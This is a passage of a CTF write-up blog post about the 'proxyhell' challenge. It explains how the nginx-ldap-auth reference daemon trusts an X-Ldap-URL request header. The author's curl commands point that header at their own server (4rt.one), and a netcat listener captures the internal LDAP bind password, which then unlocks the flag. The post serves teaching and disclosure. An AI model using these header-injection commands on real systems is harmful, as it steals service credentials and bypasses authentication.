</span></span><span style="display:flex;"><span>            ldap_dn <span style="color:#5bc4bf">=</span> user_entry[<span style="color:#f99b15">0</span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#815ba4">if</span> ldap_dn <span style="color:#5bc4bf">==</span> <span style="color:#815ba4">None</span>:
</span></span><span style="display:flex;"><span>                self<span style="color:#5bc4bf">.</span>auth_failed(ctx, <span style="color:#48b685">&#39;matched object has no dn&#39;</span>)
</span></span><span style="display:flex;"><span>                <span style="color:#815ba4">return</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            self<span style="color:#5bc4bf">.</span>log_message(<span style="color:#48b685">&#39;attempting to bind using dn &#34;</span><span style="color:#f99b15">%s</span><span style="color:#48b685">&#34;&#39;</span> <span style="color:#5bc4bf">%</span> (ldap_dn))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            ctx[<span style="color:#48b685">&#39;action&#39;</span>] <span style="color:#5bc4bf">=</span> <span style="color:#48b685">&#39;binding as an existing user &#34;</span><span style="color:#f99b15">%s</span><span style="color:#48b685">&#34;&#39;</span> <span style="color:#5bc4bf">%</span> ldap_dn
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            ldap_obj<span style="color:#5bc4bf">.</span>bind_s(ldap_dn, ctx[<span style="color:#48b685">&#39;pass&#39;</span>], ldap<span style="color:#5bc4bf">.</span>AUTH_SIMPLE)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            self<span style="color:#5bc4bf">.</span>log_message(<span style="color:#48b685">&#39;Auth OK for user &#34;</span><span style="color:#f99b15">%s</span><span style="color:#48b685">&#34;&#39;</span> <span style="color:#5bc4bf">%</span> (ctx[<span style="color:#48b685">&#39;user&#39;</span>]))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#776e71"># Successfully authenticated user</span>
</span></span><span style="display:flex;"><span>            self<span style="color:#5bc4bf">.</span>send_response(<span style="color:#f99b15">200</span>) <span style="color:#776e71">#!</span>
</span></span><span style="display:flex;"><span>            self<span style="color:#5bc4bf">.</span>end_headers()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#815ba4">except</span>:
</span></span><span style="display:flex;"><span>            self<span style="color:#5bc4bf">.</span>auth_failed(ctx)
</span></span></code></pre></div><p>In a few words: this code connects to the ldap server with internal creds and then tries to search for a user, supplied via the <code>Authorization</code> header. In case there&rsquo;s a user with such a username &ndash; it tries to connect to the ldap server again using the creds provided in the <code>Authorization</code> header. In case the connection successful, we are getting the <strong>200 OK</strong> response.</p>
<p>So it looks like to get the flag we need to have at least one pair of a valid <code>user:pass</code> combination? Okay, it&rsquo;s wrong. There&rsquo;re interesting variables in the <code>params</code> dict of the <code>LDAPAuthHandler</code> class:</p>
<div class="highlight"><pre tabindex="0" style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>    params <span style="color:#5bc4bf">=</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#776e71"># parameter      header         default</span>
</span></span><span style="display:flex;"><span>        <span style="color:#48b685">&#39;realm&#39;</span>: (<span style="color:#48b685">&#39;X-Ldap-Realm&#39;</span>, <span style="color:#48b685">&#39;Restricted&#39;</span>),
</span></span><span style="display:flex;"><span>        <span style="color:#48b685">&#39;url&#39;</span>: (<span style="color:#48b685">&#39;X-Ldap-URL&#39;</span>, <span style="color:#815ba4">None</span>),
</span></span><span style="display:flex;"><span>        <span style="color:#48b685">&#39;starttls&#39;</span>: (<span style="color:#48b685">&#39;X-Ldap-Starttls&#39;</span>, <span style="color:#48b685">&#39;false&#39;</span>),
</span></span><span style="display:flex;"><span>        <span style="color:#48b685">&#39;disable_referrals&#39;</span>: (<span style="color:#48b685">&#39;X-Ldap-DisableReferrals&#39;</span>, <span style="color:#48b685">&#39;false&#39;</span>),
</span></span><span style="display:flex;"><span>        <span style="color:#48b685">&#39;basedn&#39;</span>: (<span style="color:#48b685">&#39;X-Ldap-BaseDN&#39;</span>, <span style="color:#815ba4">None</span>),
</span></span><span style="display:flex;"><span>        <span style="color:#48b685">&#39;template&#39;</span>: (<span style="color:#48b685">&#39;X-Ldap-Template&#39;</span>, <span style="color:#48b685">&#39;(cn=</span><span style="color:#f99b15">%(username)s</span><span style="color:#48b685">)&#39;</span>),
</span></span><span style="display:flex;"><span>        <span style="color:#48b685">&#39;binddn&#39;</span>: (<span style="color:#48b685">&#39;X-Ldap-BindDN&#39;</span>, <span style="color:#48b685">&#39;&#39;</span>),
</span></span><span style="display:flex;"><span>        <span style="color:#48b685">&#39;bindpasswd&#39;</span>: (<span style="color:#48b685">&#39;X-Ldap-BindPass&#39;</span>, <span style="color:#48b685">&#39;&#39;</span>),
</span></span><span style="display:flex;"><span>        <span style="color:#48b685">&#39;cookiename&#39;</span>: (<span style="color:#48b685">&#39;X-CookieName&#39;</span>, <span style="color:#48b685">&#39;&#39;</span>)
</span></span><span style="display:flex;"><span>    }
</span></span></code></pre></div><p>Notice the <code>X-Ldap-URL</code> header. Let&rsquo;s try to point it to our arbitrary server pretending that we don&rsquo;t know a valid password:</p>
<div class="highlight"><pre tabindex="0" style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>% echo -n <span style="color:#48b685">&#34;admin:wrong&#34;</span> | base64
</span></span><span style="display:flex;"><span><span style="color:#ef6155">YWRtaW46d3Jvbmc</span><span style="color:#5bc4bf">=</span>
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>% curl localhost -H &#34;Connection: X-Real-Ip&#34; -H &#34;Authorization: basic YWRtaW46d3Jvbmc=&#34; -H &#34;X-Ldap-URL: ldap://4rt.one:100&#34;
</span></span><span style="display:flex;"><span>&lt;<span style="color:#5bc4bf">html</span>&gt;
</span></span><span style="display:flex;"><span>&lt;<span style="color:#5bc4bf">head</span>&gt;&lt;<span style="color:#5bc4bf">title</span>&gt;500 Internal Server Error&lt;/<span style="color:#5bc4bf">title</span>&gt;&lt;/<span style="color:#5bc4bf">head</span>&gt;
</span></span><span style="display:flex;"><span>&lt;<span style="color:#5bc4bf">body</span>&gt;
</span></span><span style="display:flex;"><span>&lt;<span style="color:#5bc4bf">center</span>&gt;&lt;<span style="color:#5bc4bf">h1</span>&gt;500 Internal Server Error&lt;/<span style="color:#5bc4bf">h1</span>&gt;&lt;/<span style="color:#5bc4bf">center</span>&gt;
</span></span><span style="display:flex;"><span>&lt;<span style="color:#5bc4bf">hr</span>&gt;&lt;<span style="color:#5bc4bf">center</span>&gt;nginx&lt;/<span style="color:#5bc4bf">center</span>&gt;
</span></span><span style="display:flex;"><span>&lt;/<span style="color:#5bc4bf">body</span>&gt;
</span></span><span style="display:flex;"><span>&lt;/<span style="color:#5bc4bf">html</span>&gt;
</span></span></code></pre></div><p>And if we check our server:</p>
<div class="highlight"><pre tabindex="0" style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>root@4rt.one ~ <span style="color:#776e71"># nc -lp 100</span>
</span></span><span style="display:flex;"><span>adminpassword,dc<span style="color:#5bc4bf">=</span>example,dc<span style="color:#5bc4bf">=</span>orgï¿½
</span></span></code></pre></div><p>So we were able to overwrite the default ldap server, and the nginx ldap thing tried to connect to our server with the internal password!</p>
<p>UPD. it turned out that the vulnerable nginx-ldap server was from the official <a href="https://github.com/nginxinc/nginx-ldap-auth">nginxinc github</a>. And the security advisory is posted <a href="https://www.nginx.com/blog/addressing-security-weaknesses-nginx-ldap-reference-implementation/">here</a>.</p>
<h2 id="exploit">Exploit</h2>
<p>So the full exploit is:</p>
<ol>
<li>Connect to the server with our server in the <code>X-Ldap-Header</code>:</li>
</ol>
<div class="highlight"><pre tabindex="0" style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>% curl proxyhell.ctfz.one -H &#34;Connection: X-Real-Ip&#34; -H &#34;Authorization: basic YWRtaW46d3Jvbmc=&#34; -H &#34;X-Ldap-URL: ldap://4rt.one:100&#34;
</span></span><span style="display:flex;"><span>&lt;<span style="color:#5bc4bf">html</span>&gt;
</span></span><span style="display:flex;"><span>&lt;<span style="color:#5bc4bf">head</span>&gt;&lt;<span style="color:#5bc4bf">title</span>&gt;500 Internal Server Error&lt;/<span style="color:#5bc4bf">title</span>&gt;&lt;/<span style="color:#5bc4bf">head</span>&gt;
</span></span><span style="display:flex;"><span>&lt;<span style="color:#5bc4bf">body</span>&gt;
</span></span><span style="display:flex;"><span>&lt;<span style="color:#5bc4bf">center</span>&gt;&lt;<span style="color:#5bc4bf">h1</span>&gt;500 Internal Server Error&lt;/<span style="color:#5bc4bf">h1</span>&gt;&lt;/<span style="color:#5bc4bf">center</span>&gt;
</span></span><span style="display:flex;"><span>&lt;<span style="color:#5bc4bf">hr</span>&gt;&lt;<span style="color:#5bc4bf">center</span>&gt;nginx&lt;/<span style="color:#5bc4bf">center</span>&gt;
</span></span><span style="display:flex;"><span>&lt;/<span style="color:#5bc4bf">body</span>&gt;
</span></span><span style="display:flex;"><span>&lt;/<span style="color:#5bc4bf">html</span>&gt;
</span></span></code></pre></div><ol start="2">
<li>Check logs of our server:</li>
</ol>
<div class="highlight"><pre tabindex="0" style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>root@4rt.one ~ <span style="color:#776e71"># nc -lp 100</span>
</span></span><span style="display:flex;"><span>0A<span style="color:#48b685">`</span>&lt;â–’cn<span style="color:#5bc4bf">=</span>admin,dc<span style="color:#5bc4bf">=</span>example,dc<span style="color:#5bc4bf">=</span>orgï¿½@dminpasswordisverysecure!2
</span></span></code></pre></div><p><em>If you don&rsquo;t see a full password you can try to pipe the output of nc to xxd: <code>nc -lp 100 | xxd</code></em></p>
<ol start="3">
<li>Resend the request with a valid authorization header:</li>
</ol>
<div class="highlight"><pre tabindex="0" style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>% echo -n <span style="color:#48b685">&#34;admin:@dminpasswordisverysecure\!2&#34;</span> | base64
</span></span><span style="display:flex;"><span>YWRtaW46QGRtaW5wYXNzd29yZGlzdmVyeXNlY3VyZSEy
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>% curl proxyhell.ctfz.one -H &#34;Connection: X-Real-Ip&#34; -H &#34;Authorization: basic YWRtaW46QGRtaW5wYXNzd29yZGlzdmVyeXNlY3VyZSEy&#34;
</span></span><span style="display:flex;"><span>&lt;<span style="color:#5bc4bf">html</span>&gt;
</span></span><span style="display:flex;"><span>&lt;<span style="color:#5bc4bf">body</span>&gt;
</span></span><span style="display:flex;"><span>&lt;<span style="color:#5bc4bf">h1</span>&gt;CTFZone{W3_l0v3_@_l0t_pr0xy_@nd_bug9_1n_th3m}&lt;/<span style="color:#5bc4bf">h1</span>&gt;
</span></span><span style="display:flex;"><span>&lt;/<span style="color:#5bc4bf">body</span>&gt;
</span></span><span style="display:flex;"><span>&lt;/<span style="color:#5bc4bf">html</span>&gt;
</span></span></code></pre></div><h2 id="not-the-end">Not the end</h2>
<p>Right after I solved the challenge, new info was added:</p>
<p><img src="/images/M5DN_Yior5HvAnRG9vSZH84An8Jb3Pbb" alt="img"></p>
<blockquote>
<p>We have fixed the unintended solution in the task and changed the flag.</p>
</blockquote>
<p>Okay, it was way too easy for a hard challenge. That time I thought that it was unintended that it was possible to supply your ldap server and that there was something more interesting hidden in it, but after I resend the previous request:</p>
<div class="highlight"><pre tabindex="0" style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>% curl proxyhell.ctfz.one -H &#34;Connection: X-Real-Ip&#34; -H &#34;Authorization: basic YWRtaW46QGRtaW5wYXNzd29yZGlzdmVyeXNlY3VyZSEy&#34;
</span></span><span style="display:flex;"><span>&lt;<span style="color:#5bc4bf">html</span>&gt;
</span></span><span style="display:flex;"><span>&lt;<span style="color:#5bc4bf">body</span>&gt;
</span></span><span style="display:flex;"><span>&lt;<span style="color:#5bc4bf">h1</span>&gt;CTFZone{W3_l0v3_@_l0t_pr0xy_@nd_bug9_1n_th3m_h0p3_u_3nj0y}&lt;/<span style="color:#5bc4bf">h1</span>&gt;
</span></span><span style="display:flex;"><span>&lt;/<span style="color:#5bc4bf">body</span>&gt;
</span></span><span style="display:flex;"><span>&lt;/<span style="color:#5bc4bf">html</span>&gt;
</span></span></code></pre></div><p><strong><code>Â¯\_(ãƒ„)_/Â¯</code></strong></p>
<p>About the unintended solution:</p>
<blockquote>
<p>Unintended solution was that you can just request <code>/index.html</code> and it will bypass both restrictions.</p>
</blockquote>

		</section>

		<div class="post-tags">
			
			
			<nav class="nav tags">
				<ul class="tags">
					
					<li><a href="/tags/ctf">ctf</a></li>
					
					<li><a href="/tags/proxy">proxy</a></li>
					
				</ul>
			</nav>
			
			
		</div>
	</article>
</main>
<footer>
  <div style="display:flex"><a class="soc" href="https://github.com/sh1yo" title="GitHub"><i data-feather="github"></i></a>
    <a class="border"></a><a class="soc" href="https://twitter.com/sh1yo_/" title="Twitter"><i data-feather="twitter"></i></a>
    <a class="border"></a></div>
  <div class="footer-info">
    2023  Â© sh1yo |  <a
      href="https://github.com/athul/archie">Archie Theme</a> | Built with <a href="https://gohugo.io">Hugo</a>
  </div>
</footer>

<script async src="https://www.googletagmanager.com/gtag/js?id=G-NTWQD4HQWT"></script>
<script>
var doNotTrack = false;
if (!doNotTrack) {
	window.dataLayer = window.dataLayer || [];
	function gtag(){dataLayer.push(arguments);}
	gtag('js', new Date());
	gtag('config', 'G-NTWQD4HQWT', { 'anonymize_ip': false });
}
</script>
<Paste><script>
  feather.replace()
</script></div>
    </body>
</html>
